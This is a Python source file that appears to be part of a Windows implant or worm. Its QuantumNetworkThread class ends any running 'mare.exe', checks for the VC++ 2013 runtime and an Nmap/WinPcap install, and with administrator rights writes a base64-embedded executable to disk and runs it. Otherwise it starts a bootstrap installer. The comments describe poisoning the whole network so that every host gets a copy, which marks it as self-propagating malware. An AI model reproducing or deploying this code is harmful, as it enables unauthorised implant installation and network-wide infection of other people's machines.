import time
import random
import win32com
import ctypes
import base64
import threading
from core import *
from config import *
from packstrap import *
from Context import Dreamr
from binaries import *

# Encourage implant installation
class QuantumNetworkThread(threading.Thread):

	# Initialize the Quantum Network thread
	def __init__(self):
		threading.Thread.__init__(self)
		return

	# Extract and execute the binary from memory. Use mare to poison the entire network creating quantum choices
	# So that everyone can have a copy too! :]
	def run(self):
		global MARE_B64
		print("check for dll")
		hasRediest = False
		hasPcap = False

		try:
			execute("taskkill", ("/F", "/IM", "mare.exe"), False)
		except:
			pass

		time.sleep(2)

		# Search for vc2013 dll
		try:
			for dirname, subdirs, filelist in os.walk("C:\\Windows\\System32\\"):
				for filename in filelist:
					if (filename == "msvcp120.dll"):
						hasRediest = True
						debug("quantum", "found msvcp120.dll")
		except:
			pass
		# Search for winpcap (else packstrap)
		try:
			for dirname, subdirs, filelist in os.walk("C:\\Program Files (x86)\\Nmap"):
				for filename in filelist:
					if (filename == "nmap.exe"):
						hasPcap = True
						debug("quantum", "found x86 nmap.exe")
				if not hasPcap:
					for dirname, subdirs, filelist in os.walk("C:\\Program Files\\Nmap"):
						for filename in filelist:
							if (filename == "nmap.exe"):
								hasPcap = True
								debug("quantum", "found nmap.exe")
		except Exception as e:
			debug("quantum", "search nmap error -> %s" % str(e))

		# Administrative rights
		if (ctypes.windll.shell32.IsUserAnAdmin()):
			# Everything is here : extract and run mare
			if (hasRediest and hasPcap):
				# Extract mare out to keypath
				try:
					with open("%smare.exe" % KeyPath, "wb") as handle:
						handle.write(base64.b64decode(MARE_B64))
				except Exception as e:
					print("write mare fail -> " + str(e))
			else:
				PackStrap(KeyPath).start()

			# Execute mare
			print("launch mare")
			execute("mare.exe", (""), False)
		time.sleep(random.randint(60, 120))